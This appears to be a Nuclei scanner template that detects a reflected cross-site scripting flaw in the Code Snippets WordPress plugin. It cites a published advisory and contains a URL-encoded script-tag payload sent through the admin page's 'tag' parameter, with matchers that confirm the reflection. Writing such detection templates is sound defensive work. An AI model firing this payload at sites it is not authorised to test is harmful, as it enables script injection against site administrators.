id: xss-code-snippet-wp

info:
  name: Cross-site Scripting in Code Snippets Wordpress Plugin
  author: dhiyaneshDK
  severity: medium
  description: |
    A reflected Cross-Site Scripting (XSS) vulnerability has been found in the Code Snippets WordPress Plugin. By using this vulnerability an attacker can inject malicious JavaScript code into the application, which will execute within the browser of any logged-in admin who views the link
  reference:
    - https://www.securify.nl/en/advisory/cross-site-scripting-in-code-snippets-wordpress-plugin/
  tags: wordpress,xss,plugin

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-admin/admin.php?page=snippets&tag=asdasd%5C%5C%27%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<script>alert(document.domain)</script>'
      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
